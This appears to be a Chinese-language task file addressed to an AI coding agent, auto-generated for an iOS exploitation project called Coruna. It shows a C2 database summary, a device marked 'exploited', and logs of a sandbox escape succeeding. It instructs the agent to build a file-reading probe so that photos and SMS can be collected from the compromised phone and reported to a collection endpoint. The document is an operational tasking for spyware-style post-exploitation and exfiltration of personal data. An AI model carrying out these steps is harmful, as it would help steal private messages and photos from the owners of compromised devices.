# AGENT_TASK — 自动触发的修复任务
生成时间: 2026-07-15 04:52:46

## 目标
在 Coruna 项目中推进 post-exploitation 真数据采集（相册/短信），当前卡点需你继续改代码。

## 项目路径
`C:\Users\VIP\Desktop\Coruna-main222`

## 当前诊断
```json
{
  "escape_ok": true,
  "collector_boot": true,
  "bridge_ok": true,
  "capability_ok": true,
  "listdir_hang": false,
  "malloc_missing": false,
  "need_posix": false,
  "cache_old_js": false,
  "success_level": 5,
  "actions": [],
  "ai_needed": false,
  "notes": [
    "符号解析/bridge 基本可用"
  ]
}
```

## DB 摘要
```json
{
  "collect_total": 15,
  "capability": 3,
  "js_bridge": 6,
  "dir_probe": 1,
  "photos_js": 1,
  "device": {
    "device_uuid": "2fef03ebe660024a4bfc3a45013887b7",
    "ios_version": "15.8",
    "status": "exploited",
    "exploit_stage": "completed",
    "last_seen": "2026-07-14 20:38:01.705297"
  },
  "by_category_top": {
    "real_collector:boot": 3,
    "js_nativeBridge:capability_probe": 3,
    "real_collector:chain_meta": 1,
    "real_collector:collector_apis": 1,
    "js_nativeBridge:dir_probe_js": 1,
    "js_nativeBridge:js_bridge_boot": 1,
    "js_nativeBridge:photos_list_js": 1,
    "proxy:proxy_access": 4
  }
}
```

## 已知事实
1. stock bootstrap 逃逸可 `result:0`
2. freestanding real_collector 可 `dylib_started` / `ping`，读文件返回 need_resolved_posix_api
3. JS nativeBridge 已能解析 malloc/objc 符号；`opendir/listDir` 易卡死 WebContent
4. 真回传接口是 `POST /api/collect/report`（collected_data），不是 admin exfil 空壳页
5. 不要整包替换 bootstrap；逃逸后另载 collector 或走 JS 安全读盘

## 请你立刻做
1. 读最新日志 `C:\Users\VIP\Desktop\Coruna-main222\Coruna-main\.run\uvicorn.out.log` 与 DB `C:\Users\VIP\Desktop\Coruna-main222\Coruna-main\coruna_c2.db`
2. 读 `group.html` 里 `nativeBridge` / `runPostExploitCollect`
3. 实现**不会卡死页面**的读盘探针（优先 access/open 小文件，或 ObjC NSFileManager 单路径）
4. 成功后上报 `dir_probe_js` / `photos_list_js` 到 `/api/collect/report`
5. 若成功，更新/删除本文件并写 `AGENT_SUCCESS.md`

## 最近关键日志
```
[DEVICE-LOG] [2fef03ebe660] [COLLECT-JS] capability_probe => 200
[DEVICE-LOG] [2fef03ebe660] [COLLECT-JS] getpid=10988
[DEVICE-LOG] [2fef03ebe660] [COLLECT-JS] getuid=501
[DEVICE-LOG] [2fef03ebe660] [COLLECT-JS] capability_probe => 200
[DEVICE-LOG] [2fef03ebe660] [COLLECT-JS] dir_probe_js => 200
[DEVICE-LOG] [2fef03ebe660] [COLLECT-JS] photos_list_js => 200
[DEVICE-LOG] [2fef03ebe660] [COLLECT-JS] capability_probe => 200
[DEVICE-LOG] [2fef03ebe660] [COLLECT-JS] done v5 (access dead, no path call)
[DEVICE-LOG] [4d6f7a696c6c] [PATCH] Loaded stock bootstrap: 89328B, oA=44664 (orig 45056), _process=0x68d8
[DEVICE-LOG] [4d6f7a696c6c] [LOADER] Reporting result: 0
[DEVICE-LOG] [4d6f7a696c6c] [STAGE3] Sandbox escape result: 0
[DEVICE-LOG] [4d6f7a696c6c] [PATCH] Loaded stock bootstrap: 89328B, oA=44664 (orig 45056), _process=0x68d8
[DEVICE-LOG] [4d6f7a696c6c] [STAGE3] Sandbox escape result: 0
[DEVICE-LOG] [4d6f7a696c6c] [LOADER] Reporting result: 0
```

## 一句话
继续修：从 capability_probe 推进到安全目录/文件读取并入库。
